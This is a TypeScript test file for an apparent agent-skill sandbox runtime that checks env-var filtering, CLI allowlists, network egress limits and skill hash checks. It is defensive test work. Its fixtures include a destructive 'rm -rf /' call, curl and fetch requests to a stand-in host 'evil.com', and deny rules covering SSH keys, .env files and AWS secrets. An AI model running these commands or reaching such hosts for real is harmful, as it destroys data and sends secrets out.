import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createSkillRuntime, diffCapabilities } from "../runtime/exec.js";
import type { SkillRuntime, CapabilityDelta } from "../runtime/exec.js";
import { SecClawBridge } from "../events/secclaw-bridge.js";
import type { SecClawEvent } from "../events/secclaw-bridge.js";
import type { SkillFrontmatter, SkillCapabilities } from "../schema/skill-frontmatter.js";

function makeBridge(): SecClawBridge {
  return new SecClawBridge({
    transport: "http",
    endpoint: "http://127.0.0.1:9999/events",
    secret: "test-secret",
    manualFlush: true,
    onError: () => {},
  });
}

function makeSkill(overrides?: Partial<SkillFrontmatter>): SkillFrontmatter {
  return {
    name: "test-skill",
    description: "Test skill",
    version: "1.0.0",
    author: "test",
    tags: ["test"],
    requires: {
      bins: ["orderly"],
      install: [
        { id: "npm", kind: "command", command: "npm install -g @orderly.network/cli", bins: ["orderly"], label: "Install" },
      ],
    },
    capabilities: {
      cli: [{ binary: "echo", subcommands: ["hello"] }],
      env: { reads: ["TEST_VAR"], denied: ["AWS_*"] },
      filesystem: {
        read: ["./**"],
        write: ["./output/**"],
        denied: ["~/.ssh/**", "**/.env*"],
      },
      network: { egress: ["api.orderly.org"] },
    },
    ...overrides,
  };
}

describe("createSkillRuntime", () => {
  it("throws when skill has no capabilities", () => {
    const bridge = makeBridge();
    assert.throws(
      () => createSkillRuntime({ skill: makeSkill({ capabilities: undefined }), bridge }),
      /deny-by-default/,
    );
  });

  it("creates runtime with valid capabilities", () => {
    const bridge = makeBridge();
    const runtime = createSkillRuntime({ skill: makeSkill(), bridge });
    assert.ok(runtime.exec);
    assert.ok(runtime.fetch);
    assert.ok(runtime.readFile);
    assert.ok(runtime.writeFile);
    assert.ok(runtime.getEnv);
  });

  it("throws on hash mismatch when hash is non-zero", () => {
    const bridge = makeBridge();
    const testFilePath = new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, "$1");
    const skill = makeSkill({ hash: "sha256:deadbeef" + "0".repeat(56) });
    assert.throws(
      () => createSkillRuntime({ skill, bridge, skillFilePath: testFilePath }),
      /integrity check failed/,
    );
  });

  it("skips hash check when hash is all-zeros", () => {
    const bridge = makeBridge();
    const testFilePath = new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, "$1");
    const skill = makeSkill({ hash: "sha256:" + "0".repeat(64) });
    const runtime = createSkillRuntime({ skill, bridge, skillFilePath: testFilePath });
    assert.ok(runtime);
  });
});

describe("filterEnv (via getEnv)", () => {
  let runtime: SkillRuntime;

  beforeEach(() => {
    const bridge = makeBridge();
    runtime = createSkillRuntime({ skill: makeSkill(), bridge });
  });

  it("allows declared env reads", () => {
    process.env.TEST_VAR = "test-value";
    assert.equal(runtime.getEnv("TEST_VAR"), "test-value");
    delete process.env.TEST_VAR;
  });

  it("blocks undeclared env reads", () => {
    process.env.SECRET_TOKEN = "secret";
    assert.equal(runtime.getEnv("SECRET_TOKEN"), undefined);
    delete process.env.SECRET_TOKEN;
  });

  it("blocks denied env vars", () => {
    process.env.AWS_SECRET_KEY = "secret";
    assert.equal(runtime.getEnv("AWS_SECRET_KEY"), undefined);
    delete process.env.AWS_SECRET_KEY;
  });
});

describe("exec CLI validation", () => {
  let runtime: SkillRuntime;

  beforeEach(() => {
    const bridge = makeBridge();
    runtime = createSkillRuntime({ skill: makeSkill(), bridge });
  });

  it("blocks undeclared binary", async () => {
    const result = await runtime.exec("rm", ["-rf", "/"]);
    assert.ok(result.blocked);
    assert.ok(result.reason?.includes("Undeclared CLI invocation"));
  });

  it("blocks undeclared subcommand", async () => {
    const result = await runtime.exec("echo", ["world"]);
    assert.ok(result.blocked);
    assert.ok(result.reason?.includes("Undeclared CLI invocation"));
  });
});

describe("exec URL egress validation", () => {
  it("blocks curl with undeclared egress URL", async () => {
    const bridge = makeBridge();
    const skill = makeSkill({
      capabilities: {
        cli: [{ binary: "curl", subcommands: ["-s"] }],
        network: { egress: ["api.orderly.org"] },
      },
    });
    const runtime = createSkillRuntime({ skill, bridge });
    const result = await runtime.exec("curl", ["-s", "https://evil.com/data"]);
    assert.ok(result.blocked);
    assert.ok(result.reason?.includes("Undeclared egress"));
  });
});

describe("fetch egress validation", () => {
  let runtime: SkillRuntime;

  beforeEach(() => {
    const bridge = makeBridge();
    runtime = createSkillRuntime({ skill: makeSkill(), bridge });
  });

  it("blocks undeclared egress host", async () => {
    await assert.rejects(
      () => runtime.fetch("https://evil.com/data"),
      /undeclared network egress/,
    );
  });

  it("blocks invalid URL", async () => {
    await assert.rejects(
      () => runtime.fetch("not-a-url"),
      /Blocked: invalid URL/,
    );
  });
});

describe("diffCapabilities", () => {
  it("detects added CLI binaries", () => {
    const current: SkillCapabilities = {
      cli: [{ binary: "curl", subcommands: ["-s"] }, { binary: "wget", subcommands: ["get"] }],
    };
    const baseline: SkillCapabilities = {
      cli: [{ binary: "curl", subcommands: ["-s"] }],
    };
    const delta: CapabilityDelta = diffCapabilities(current, baseline);
    assert.ok(delta.expanded);
    assert.deepEqual(delta.addedCliBinaries, ["wget"]);
  });

  it("detects added egress", () => {
    const current: SkillCapabilities = {
      network: { egress: ["api.orderly.org", "evil.com"] },
    };
    const baseline: SkillCapabilities = {
      network: { egress: ["api.orderly.org"] },
    };
    const delta = diffCapabilities(current, baseline);
    assert.ok(delta.expanded);
    assert.deepEqual(delta.addedEgress, ["evil.com"]);
  });

  it("reports no expansion when identical", () => {
    const caps: SkillCapabilities = {
      cli: [{ binary: "orderly", subcommands: ["symbols"] }],
    };
    const delta = diffCapabilities(caps, caps);
    assert.ok(!delta.expanded);
  });
});

describe("sidecar hash-at-load verification", () => {
  it("throws when sidecar hash does not match file content", () => {
    const bridge = makeBridge();
    const tmp = mkdtempSync(join(tmpdir(), "oc-test-"));
    const skillContent = "# Test SKILL\nsome content";
    const skillPath = join(tmp, "SKILL.md");
    writeFileSync(skillPath, skillContent);

    const secclawDir = join(tmp, ".secclaw");
    mkdirSync(secclawDir);
    writeFileSync(
      join(secclawDir, "skill-hashes.json"),
      JSON.stringify({ "test-skill": "sha256:" + "f".repeat(64) }),
    );

    const skill = makeSkill();
    assert.throws(
      () => createSkillRuntime({ skill, bridge, skillFilePath: skillPath, secclawDir }),
      /SecClaw sidecar hash mismatch/,
    );
  });

  it("passes when sidecar hash matches file content", () => {
    const bridge = makeBridge();
    const tmp = mkdtempSync(join(tmpdir(), "oc-test-"));
    const skillContent = "# Test SKILL\nsome content";
    const skillPath = join(tmp, "SKILL.md");
    writeFileSync(skillPath, skillContent);

    const hash = "sha256:" + createHash("sha256").update(skillContent).digest("hex");
    const secclawDir = join(tmp, ".secclaw");
    mkdirSync(secclawDir);
    writeFileSync(
      join(secclawDir, "skill-hashes.json"),
      JSON.stringify({ "test-skill": hash }),
    );

    const skill = makeSkill();
    const runtime = createSkillRuntime({ skill, bridge, skillFilePath: skillPath, secclawDir });
    assert.ok(runtime);
  });

  it("emits warning and continues when sidecar is missing", () => {
    const bridge = makeBridge();
    const skill = makeSkill();
    const runtime = createSkillRuntime({
      skill,
      bridge,
      skillFilePath: "/nonexistent/SKILL.md",
      secclawDir: "/nonexistent/.secclaw",
    });
    assert.ok(runtime);

    const events = bridge.drain();
    const violation = events.find(
      (e: SecClawEvent) =>
        e.type === "skill.capability.violation" &&
        (e.payload as Record<string, unknown>).subkind === "hash-at-load",
    );
    assert.ok(violation);
  });
});

describe("filterEnv hardening", () => {
  it("excludes undeclared env vars like DATABASE_URL from child env", () => {
    const bridge = makeBridge();
    const runtime = createSkillRuntime({ skill: makeSkill(), bridge });
    process.env.DATABASE_URL = "postgres://secret";
    assert.equal(runtime.getEnv("DATABASE_URL"), undefined);
    delete process.env.DATABASE_URL;
  });

  it("excludes NODE_PATH from child env", () => {
    const bridge = makeBridge();
    const runtime = createSkillRuntime({ skill: makeSkill(), bridge });
    process.env.NODE_PATH = "/malicious/modules";
    assert.equal(runtime.getEnv("NODE_PATH"), undefined);
    delete process.env.NODE_PATH;
  });
});

describe("skill.cli.error event", () => {
  it("emits skill.cli.error on exec failure", async () => {
    const bridge = makeBridge();
    const skill = makeSkill({
      capabilities: {
        cli: [{ binary: "nonexistent-binary-xyz", subcommands: ["run"] }],
      },
    });
    const runtime = createSkillRuntime({ skill, bridge });
    const result = await runtime.exec("nonexistent-binary-xyz", ["run"]);

    assert.equal(result.blocked, false);
    assert.notEqual(result.exitCode, 0);

    const events = bridge.drain();
    const errorEvent = events.find((e: SecClawEvent) => e.type === "skill.cli.error");
    assert.ok(errorEvent, "Expected a skill.cli.error event");
    assert.equal((errorEvent!.payload as Record<string, unknown>).binary, "nonexistent-binary-xyz");
  });
});
